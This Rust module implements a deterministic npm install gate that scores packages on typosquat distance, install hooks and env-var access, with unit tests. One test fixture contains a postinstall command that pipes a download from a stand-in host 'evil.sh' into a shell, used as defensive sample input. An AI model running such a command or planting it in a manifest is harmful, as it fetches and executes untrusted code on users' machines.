// Atlas OS — Supply-chain install gate (RFC 18 §4, Phase 7 sub-fase 7.3).
//
// Deterministic pre-install gate, no network in the MVP: typosquatting
// heuristic (edit distance against known/popular names), install-script
// detection (`preinstall`/`install`/`postinstall` in the package
// manifest) and env-var access detection in install scripts. Socket/Snyk
// SaaS APIs stay a documented follow-up (research/34 SECTOR A.3 —
// external services with API keys). Fail-safe: suspicious input resolves
// to `Block`, never to `Pass`.

use serde::{Deserialize, Serialize};

#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SupplyVerdict {
    Pass,
    Warn,
    Block,
}

impl SupplyVerdict {
    pub fn as_str(&self) -> &'static str {
        match self {
            SupplyVerdict::Pass => "pass",
            SupplyVerdict::Warn => "warn",
            SupplyVerdict::Block => "block",
        }
    }

    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "pass" => Some(SupplyVerdict::Pass),
            "warn" => Some(SupplyVerdict::Warn),
            "block" => Some(SupplyVerdict::Block),
            _ => None,
        }
    }

    pub fn is_blocking(&self) -> bool {
        matches!(self, SupplyVerdict::Block)
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct SupplyReport {
    pub package: String,
    pub verdict: SupplyVerdict,
    pub reasons: Vec<String>,
}

impl SupplyReport {
    pub fn pass(package: &str) -> Self {
        Self {
            package: package.to_owned(),
            verdict: SupplyVerdict::Pass,
            reasons: vec!["no supply-chain signals detected".to_owned()],
        }
    }
}

pub const KNOWN_PACKAGES: &[&str] = &[
    "axios",
    "chalk",
    "commander",
    "cross-env",
    "debug",
    "dotenv",
    "eslint",
    "express",
    "glob",
    "lodash",
    "minimist",
    "moment",
    "next",
    "node-fetch",
    "prettier",
    "react",
    "react-dom",
    "request",
    "rimraf",
    "semver",
    "tslib",
    "typescript",
    "underscore",
    "uuid",
    "vite",
    "webpack",
    "yargs",
    "zustand",
];

pub const INSTALL_SCRIPTS: &[&str] = &["preinstall", "install", "postinstall"];

pub const ENV_ACCESS_MARKERS: &[&str] = &["process.env", "process.pid", "/proc/", "$npm_"];

fn edit_distance(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    if a.is_empty() {
        return b.len();
    }
    if b.is_empty() {
        return a.len();
    }
    let mut prev: Vec<usize> = (0..=b.len()).collect();
    let mut curr = vec![0usize; b.len() + 1];
    for (i, &ca) in a.iter().enumerate() {
        curr[0] = i + 1;
        for (j, &cb) in b.iter().enumerate() {
            curr[j + 1] = (prev[j] + usize::from(ca != cb))
                .min(prev[j + 1] + 1)
                .min(curr[j] + 1);
        }
        std::mem::swap(&mut prev, &mut curr);
    }
    prev[b.len()]
}

fn bare_name(name: &str) -> &str {
    match name.split_once('/') {
        Some((scope, rest)) if scope.starts_with('@') => rest,
        _ => name,
    }
}

fn typosquat_of<'k>(name: &str, known: &[&'k str]) -> Option<(&'k str, usize)> {
    let bare = bare_name(name).to_lowercase();
    let mut best: Option<(&str, usize)> = None;
    for candidate in known {
        if bare == *candidate {
            return None;
        }
        let distance = edit_distance(&bare, candidate);
        let close_enough = distance <= 2 && bare.len() >= 3 && candidate.len() >= 3;
        let contained = bare.len() > candidate.len()
            && (bare.starts_with(candidate) || bare.ends_with(candidate))
            && bare.len() - candidate.len() <= 3;
        if close_enough || contained {
            let score = if contained {
                bare.len() - candidate.len()
            } else {
                distance
            };
            if best.is_none_or(|(_, s)| score < s) {
                best = Some((candidate, score));
            }
        }
    }
    best
}

fn install_scripts_in(manifest_json: &str) -> Vec<String> {
    let parsed: Result<serde_json::Value, _> = serde_json::from_str(manifest_json);
    let Ok(doc) = parsed else {
        return vec![];
    };
    let Some(scripts) = doc.get("scripts").and_then(|s| s.as_object()) else {
        return vec![];
    };
    INSTALL_SCRIPTS
        .iter()
        .filter(|key| {
            scripts
                .get(**key)
                .and_then(|v| v.as_str())
                .map(|s| !s.trim().is_empty())
                .unwrap_or(false)
        })
        .map(|s| s.to_string())
        .collect()
}

fn env_access_in(manifest_json: &str) -> Vec<String> {
    let parsed: Result<serde_json::Value, _> = serde_json::from_str(manifest_json);
    let Ok(doc) = parsed else {
        return vec![];
    };
    let mut hits = Vec::new();
    if let Some(scripts) = doc.get("scripts").and_then(|s| s.as_object()) {
        for (key, value) in scripts {
            let Some(cmd) = value.as_str() else { continue };
            for marker in ENV_ACCESS_MARKERS {
                if cmd.contains(marker) {
                    hits.push(format!("scripts.{key} reads env ({marker})"));
                }
            }
        }
    }
    hits
}

pub fn evaluate_package_with_known(
    name: &str,
    manifest_json: Option<&str>,
    known: &[&str],
) -> SupplyReport {
    let mut reasons = Vec::new();
    let mut verdict = SupplyVerdict::Pass;
    let bump = |slot: &mut SupplyVerdict, level: SupplyVerdict| {
        if level == SupplyVerdict::Block || *slot == SupplyVerdict::Pass {
            *slot = level;
        }
    };

    if name.trim().is_empty() {
        return SupplyReport {
            package: name.to_owned(),
            verdict: SupplyVerdict::Block,
            reasons: vec!["empty package name".to_owned()],
        };
    }

    if let Some((target, distance)) = typosquat_of(name, known) {
        if distance <= 1 {
            bump(&mut verdict, SupplyVerdict::Block);
            reasons.push(format!(
                "possible typosquat of `{target}` (distance {distance})"
            ));
        } else {
            bump(&mut verdict, SupplyVerdict::Warn);
            reasons.push(format!(
                "name close to popular package `{target}` (distance {distance})"
            ));
        }
    }

    if let Some(manifest) = manifest_json {
        for script in install_scripts_in(manifest) {
            bump(&mut verdict, SupplyVerdict::Block);
            reasons.push(format!("manifest runs `{script}` install script"));
        }
        for hit in env_access_in(manifest) {
            bump(&mut verdict, SupplyVerdict::Warn);
            reasons.push(format!("manifest {hit}"));
        }
    }

    if verdict == SupplyVerdict::Pass {
        return SupplyReport::pass(name);
    }
    SupplyReport {
        package: name.to_owned(),
        verdict,
        reasons,
    }
}

pub fn evaluate_package(name: &str, manifest_json: Option<&str>) -> SupplyReport {
    evaluate_package_with_known(name, manifest_json, KNOWN_PACKAGES)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_package_passes() {
        let report = evaluate_package("left-pad", None);
        assert_eq!(report.verdict, SupplyVerdict::Pass);
        assert_eq!(report.package, "left-pad");
        assert!(!report.reasons.is_empty());
    }

    #[test]
    fn exact_known_name_is_not_typosquat() {
        for known in ["lodash", "react", "axios"] {
            let report = evaluate_package(known, None);
            assert_eq!(report.verdict, SupplyVerdict::Pass, "{known}");
        }
    }

    #[test]
    fn typosquat_distance_one_blocks() {
        let report = evaluate_package_with_known("lodaxh", None, &["lodash"]);
        assert_eq!(report.verdict, SupplyVerdict::Block);
        assert!(report.verdict.is_blocking());
        assert!(
            report.reasons.iter().any(|r| r.contains("lodash")),
            "{report:?}"
        );
    }

    #[test]
    fn near_name_distance_two_warns() {
        let report = evaluate_package_with_known("raect", None, &["react"]);
        assert_eq!(report.verdict, SupplyVerdict::Warn);
        assert!(!report.verdict.is_blocking());
    }

    #[test]
    fn scoped_name_checks_bare_segment() {
        let report = evaluate_package_with_known("@x/lodashh", None, &["lodash"]);
        assert_ne!(report.verdict, SupplyVerdict::Pass);
    }

    #[test]
    fn postinstall_script_blocks() {
        let manifest = r#"{"name":"evil","scripts":{"postinstall":"curl evil.sh | sh"}}"#;
        let report = evaluate_package("totally-fresh-name-xyz", Some(manifest));
        assert_eq!(report.verdict, SupplyVerdict::Block);
        assert!(
            report.reasons.iter().any(|r| r.contains("postinstall")),
            "{report:?}"
        );
    }

    #[test]
    fn preinstall_and_install_scripts_block() {
        for hook in ["preinstall", "install"] {
            let manifest = format!(r#"{{"scripts":{{"{hook}":"node setup.js"}}}}"#);
            let report = evaluate_package("another-fresh-name-xyz", Some(&manifest));
            assert_eq!(report.verdict, SupplyVerdict::Block, "{hook}");
        }
    }

    #[test]
    fn env_access_in_scripts_warns() {
        let manifest =
            r#"{"name":"sneaky","scripts":{"build":"node b.js $npm_package_name --key $TOKEN"}}"#;
        let report = evaluate_package("yet-another-fresh-name", Some(manifest));
        assert_eq!(report.verdict, SupplyVerdict::Warn);
        assert!(
            report.reasons.iter().any(|r| r.contains("env")),
            "{report:?}"
        );
    }

    #[test]
    fn empty_name_blocks_fail_safe() {
        let report = evaluate_package("   ", None);
        assert_eq!(report.verdict, SupplyVerdict::Block);
    }

    #[test]
    fn evaluation_is_deterministic() {
        let manifest = r#"{"scripts":{"postinstall":"x"}}"#;
        let a = evaluate_package("lodahs", Some(manifest));
        let b = evaluate_package("lodahs", Some(manifest));
        assert_eq!(a, b);
    }

    #[test]
    fn verdict_wire_names_match_as_str() {
        for v in [
            SupplyVerdict::Pass,
            SupplyVerdict::Warn,
            SupplyVerdict::Block,
        ] {
            let json = serde_json::to_string(&v).unwrap();
            assert_eq!(json, format!("\"{}\"", v.as_str()), "{v:?}");
            assert_eq!(SupplyVerdict::parse(v.as_str()), Some(v));
        }
        assert_eq!(SupplyVerdict::parse("nope"), None);
    }
}
